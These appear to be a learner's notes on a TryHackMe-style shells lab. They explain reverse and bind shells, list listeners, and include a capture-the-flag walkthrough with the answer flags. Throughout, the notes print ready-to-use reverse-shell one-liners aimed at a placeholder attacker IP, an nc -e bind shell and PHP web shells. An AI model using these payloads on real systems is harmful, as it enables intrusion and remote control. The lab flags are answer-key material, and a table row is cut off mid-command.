# Shells Overview 
This is a summary of the core concepts of "Shells" in penetration testing, the differences between Reverse and Bind shells, and the tools/payloads used to create them _without_ the Metasploit Framework.

## 1. 💡 What is a Shell? 

A **Shell** is a software interface that allows a user to "interact" with an Operating System (OS).

In cybersecurity, a "shell" refers to a **session that an attacker uses to remotely control a compromised system.**

### 🎯 Why Do Attackers Want Shells?

Gaining a shell is the "foothold" on a target. It allows an attacker to:

- **Remote Control:** Execute commands on the target.
    
- **Privilege Escalation:** Try to upgrade permissions from a normal user to `root` or `SYSTEM`.
    
- **Data Exfiltration:** Steal sensitive data.
    
- **Persistence:** Create backdoors or new users to maintain access.
    
- **Pivoting:** Use the compromised machine as a "base" to attack other machines on the internal network.
    

---

## 2. 🔌 Shell Types: Reverse vs. Bind 

There are two primary types of shells, which work in opposite ways:

### 🚀 Reverse Shell (Connect-Back) 

- **How it works:** The **"Victim" machine** "initiates" a connection "back" to the **"Attacker" machine**.
    
- **Why it's popular:** This is the most common technique because it **bypasses most firewalls**.
    
- **Reason:** Firewalls are typically configured to "block" _incoming_ connections (Attacker connecting to Victim) but "allow" _outgoing_ connections (Victim connecting out to the internet). A reverse shell masks itself as a normal outgoing connection.
    

### 🔗 Bind Shell (Listen)

- **How it works:** The **"Victim" machine** "opens a port" (binds) and "listens" for a connection.
    
- The **"Attacker" machine** then "connects to" that open port to get the shell.
    
- **When to use:** Used in rare scenarios where the victim's firewall **"blocks" outgoing connections**, but _allows_ incoming ones.
    
- **Downsides:** It's "noisy" (a new open port is easy to detect) and **ports below 1024 require `root` privileges** to bind.
    

---

## 3. 🎧 Shell Listeners: The Attacker's Tools

A "Listener" is the program we (the Attacker) run on our machine to "catch" the connection from a Reverse Shell.

|**Tool**|**Example Command (Listen on Port 443)**|**Description**|
|---|---|---|
|**Netcat (nc)**|`nc -lvnp 443`|(Classic) The most basic tool. Creates a "Dumb Shell" (arrow keys don't work).|
|**Rlwrap**|`rlwrap nc -lvnp 443`|(Recommended) A "wrapper" that upgrades `nc` to a "Smart Shell" (arrow keys for history work).|
|**Ncat**|`ncat -lvnp 443`<br><br>  <br><br>`ncat --ssl -lvnp 443`|The upgraded `nc` from the Nmap project. Its best feature is native **SSL encryption (`--ssl`)**.|
|**Socat**|`socat -d -d TCP-LISTEN:443 STDOUT`|(Advanced) The "Swiss Army knife" for networks. Highly flexible but more complex.|

---

## 4. 🎯 Shell Payloads: The Victim's "One-Liners"

A Payload is the "command" or "script" we execute on the victim machine to make it connect back to us (Reverse Shell).

### Bash (Most common on Linux)

Bash

```
# Standard Bash Payload (using /dev/tcp)
bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1
```

### Python

Bash

```
# A stable payload (using pty)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[ATTACKER_IP]",[PORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### PHP

(Common for web server exploits)

Bash

```
php -r '$sock=fsockopen("[ATTACKER_IP]",[PORT]);exec("sh <&3 >&3 2>&3");'
```

### BusyBox

(Common on IoT devices or Docker)

Bash

```
busybox nc [ATTACKER_IP] [PORT] -e sh
```

_Note: The `rm -f /tmp/f; mkfifo /tmp/f; ... | nc ... >/tmp/f` payload is another classic `nc` payload that is more portable than the `bash -i` one._

---

## 5. 🌐 Web Shells: The Web Backdoor

A **Web Shell** is a special type of payload. It's a "script" (e.g., `.php`, `.asp`, `.jsp`) that the attacker "uploads" or "injects" onto the web server.

This script acts as a **"Backdoor"**, allowing the attacker to "execute commands" simply by visiting a URL in their browser.

### Simple PHP Web Shell

This is the simplest, most effective web shell:

PHP

```
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
```

- **How to use:**
    
    1. Attacker uploads this as `shell.php`.
        
    2. Attacker executes commands via their browser:
        
        http://victim.com/uploads/shell.php?cmd=whoami
        

### Full-Featured Web Shells

Some web shells are complex applications with a full GUI for file management and terminal access.

- **`p0wny-shell`**: A minimal, clean, single-file PHP shell.
    
- **`b374k shell`**: A feature-rich shell.
    
- **`c99 shell`**: A legendary, well-known shell.
    

---

## 6. 🏆 Practical Task 8: Walkthrough

This task provided two paths to get a flag.

### Path 1: Command Injection (Port 8081)

- **Q:** `...exploit the command injection vulnerability... What is the flag?`
    
- **A:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`
    
- **Walkthrough:**
    
    1. **Attacker (Listener):** Start a listener. The example write-up used port 8081.
        
        Bash
        
        ```
        nc -lvnp 8081
        ```
    2. **Victim (Payload):** Go to `http://[VICTIM_IP]:8081`. The `bash -i` payload failed, so the correct, more portable payload was used (as seen in `image_d27970.png`):
        
        Bash
        
        ```
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] 8081 >/tmp/f
        ```
    3. **Attacker (Get Shell):** The listener catches the reverse shell.
        
        Bash
        
        ```
        $ www-data@...:/var/www/html$
        ```
    4. **Attacker (Find Flag):**
        
        Bash
        
        ```
        $ cd /
        $ ls
        ...
        flag.txt
        ...
        $ cat /flag.txt
        THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
        ```

### Path 2: Unrestricted File Upload (Port 8082)

- **Q:** `...exploit the unrestricted file upload vulnerability... What is the flag?`
    
- **A:** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`
    
- **Walkthrough:**
    
    1. **Attacker (Create Web Shell):** Create a simple PHP file reader shell named `shell.php`
        
        PHP
        
        ```
        <?php
          echo "<pre>";
          // Read the file from the 'file' parameter,
          // or read /flag.txt by default.
          $file = isset($_GET['file']) ? $_GET['file'] : '/flag.txt';
          echo @file_get_contents($file);
          echo "</pre>";
        ?>
        ```
	2. **Victim (Upload):** Go to `http://[VICTIM_IP]:8082` (the "Data Scientist Position" page) and upload the `shell.php` file.
		        
    3. Attacker (Execute): The system confirms the upload. The attacker accesses the shell, which is likely in an /uploads/ directory:
        
        http://[VICTIM_IP]:8082/uploads/shell.php
        
    4. **Result:** The script executes, reads the default file (`/flag.txt`), and prints the flag to the browser.
        

---

---

# 🚀 Shells Overview Cheat Sheet (English)

## 1. 🎧 Listeners (Attacker Machine)

_Run one of these on your machine _before_ executing the payload on the victim._

|**Tool**|**Command (Example: Listen on Port 443)**|**Notes**|
|---|---|---|
|**Netcat (Standard)**|`nc -lvnp 443`|"Dumb Shell" (no arrow keys)|
|**Rlwrap (Recommended)**|`rlwrap nc -lvnp 443`|"Smart Shell" (enables arrow keys)|
|**Ncat (Encrypted)**|`ncat --ssl -lvnp 443`|Best for stealth (encrypts traffic)|
|**Socat (Advanced)**|`socat -d -d TCP-LISTEN:443 STDOUT`|Highly flexible|

## 2. 🎯 Payloads (Victim Machine)

_Replace `[IP]` with your Attacker IP and `[PORT]` with your Listener port._

|**Type**|**"One-Liner" Payload (for Reverse Shell)**|
|---|---|
|**Bash**|`bash -i >& /dev/tcp/[IP]/[PORT] 0>&1`|
|**Python 3**|`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[IP]",[PORT]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`|
|**PHP**|`php -r '$sock=fsockopen("[IP]",[PORT]);exec("sh <&3 >&3 2>&3");'`|
|**Netcat (Portable)**|`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|
|**Web Shell (PHP)**|`<?php system($_GET['cmd']); ?>` (Upload this file)<br><br>  <br><br>`http://[VICTIM_IP]/shell.php?cmd=whoami` (Execute)|
|**Netcat (Bind Shell)**|`nc -l -p 8080 -e /bin/bash` (Run on Victim)<br><br>  <br><br>`nc -nv [VICTIM_IP] 8080` (Run on Attacker)|

## 3. 🧠 Situational Guide (Which one to use?)

|**🧠 Situation...**|**🚀 Use this technique...**|
|---|---|
|Victim's firewall **blocks incoming** (Standard)|**Reverse Shell** (Victim connects back to you)|
|Victim's firewall **blocks outgoing** (Rare)|**Bind Shell** (You connect to the victim)|
|You get a shell, but arrow keys don't work|Use **`rlwrap nc ...`** as your listener|
|You get a shell, but traffic is unencrypted|Use **`ncat --ssl ...`** as your listener (and a compatible payload)|
|You found a **File Upload** vulnerability|**Web Shell** (Upload `shell.php` and run commands with `?cmd=...`)|
|You found **Command Injection**|**Reverse Shell** (Inject a `bash -i ...` or `python -c ...` payload)|
|Your `bash -i /dev/tcp/...` payload does nothing (is "quiet")|**The victim doesn't have `bash`!** Try the **Python** or **`nc mkfifo`** payload instead.|
